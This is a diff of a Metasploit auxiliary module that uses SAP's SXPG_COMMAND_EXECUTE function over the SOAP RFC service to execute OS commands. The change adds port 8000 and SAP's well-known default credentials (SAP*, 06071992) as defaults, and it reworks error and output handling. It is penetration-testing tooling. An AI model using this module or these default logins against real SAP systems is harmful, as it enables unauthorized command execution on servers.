@@ -28,21 +28,30 @@ class Metasploit4 < Msf::Auxiliary
 		super(
 			'Name' => 'SAP SOAP RFC SXPG_COMMAND_EXECUTE',
 			'Description' => %q{
-				This module makes use of the SXPG_COMMAND_EXECUTE Remote Function Call (via SOAP)
-				to execute OS commands as configured in SM69.
+					This module makes use of the SXPG_COMMAND_EXECUTE Remote Function Call, through
+				the use of the /sap/bc/soap/rfc SOAP service to execute OS commands as configured
+				in the SM69 transaction.
 				},
-			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]],
-			'Author' => [ 'Agnivesh Sathasivam','nmonkee' ],
-			'License' => BSD_LICENSE
-			)
+			'References' =>
+				[
+					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
+				],
+			'Author' =>
+				[
+					'Agnivesh Sathasivam',
+					'nmonkee'
+				],
+			'License' => MSF_LICENSE
+		)
 		register_options(
 			[
-				OptString.new('CLIENT', [true, 'Client', nil]),
-				OptString.new('USERNAME', [true, 'Username', nil]),
-				OptString.new('PASSWORD', [true, 'Password', nil]),
-				OptString.new('CMD', [true, 'Command to be executed', nil]),
-				OptString.new('PARAM', [false, 'Additional parameters', nil]),
-				OptEnum.new('OS', [true, 'Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
+				Opt::RPORT(8000),
+				OptString.new('CLIENT', [true, 'SAP Client', '001']),
+				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+				OptString.new('PASSWORD', [true, 'Password', '06071992']),
+				OptString.new('CMD', [true, 'SM69 command to be executed', nil]),
+				OptString.new('PARAM', [false, 'Additional parameters for the SM69 command', nil]),
+				OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
 			], self.class)
 	end
 
@@ -82,8 +91,13 @@ class Metasploit4 < Msf::Auxiliary
 				# to do - implement error handlers for each status code, 404, 301, etc.
 				print_error("[SAP] #{ip}:#{rport} - something went wrong!")
 				return
-			else
-				success = true
+			elsif res and res.body =~ /faultstring/
+				error = res.body.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
+				0.upto(error.length-1) do |i|
+					print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
+				end
+				return
+			elsif res
 				print_status("[SAP] #{ip}:#{rport} - got response")
 				saptbl = Msf::Ui::Console::Table.new(
 					Msf::Ui::Console::Table::Style::Default,
@@ -93,26 +107,19 @@ class Metasploit4 < Msf::Auxiliary
 						'Indent'  => 1,
 						'Columns' =>["Output",]
 						)
-				response = res.body if res
-				if response =~ /faultstring/
-					error = response.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
-					sucess = false
-				end
-				output = response.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
+				output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
 				for i in 0..output.length-1
 					saptbl << [output[i]]
 				end
+				print(saptbl.to_s)
+				return
+			else
+				print_error("[SAP] #{ip}:#{rport} - Unknown error")
+				return
 			end
 		rescue ::Rex::ConnectionError
 			print_error("[SAP] #{ip}:#{rport} - Unable to connect")
-			return false
-		end
-		if success
-			print(saptbl.to_s)
-		elsif !sucess
-			0.upto(error.length-1) do |i|
-				print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
-			end
+			return
 		end
 	end
 end
